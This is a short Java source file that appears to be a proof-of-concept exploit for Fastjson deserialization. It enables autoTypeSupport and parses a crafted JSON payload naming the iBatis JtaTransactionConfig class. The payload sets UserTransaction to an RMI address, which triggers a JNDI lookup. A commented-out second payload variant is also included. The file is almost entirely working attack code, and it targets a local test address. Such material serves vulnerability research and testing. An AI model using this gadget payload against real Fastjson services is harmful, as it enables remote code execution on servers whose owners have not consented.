package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.sql.SQLException;


public class JtaTransactionConfig {
    public static void main(String[] args) throws SQLException {
        String fastSer =  "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"@type\":\"java.util.Properties\",\"UserTransaction\":\"rmi://127.0.0.1:1999/Obj\"}}";
//        String fastSer = "{\"@type\":\"java.util.Properties\",\"UserTransaction\":\"rmi://127.0.0.1:1999/Obj\"}";
        System.out.println(fastSer);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
        JSON.parseObject(fastSer);
    }
}
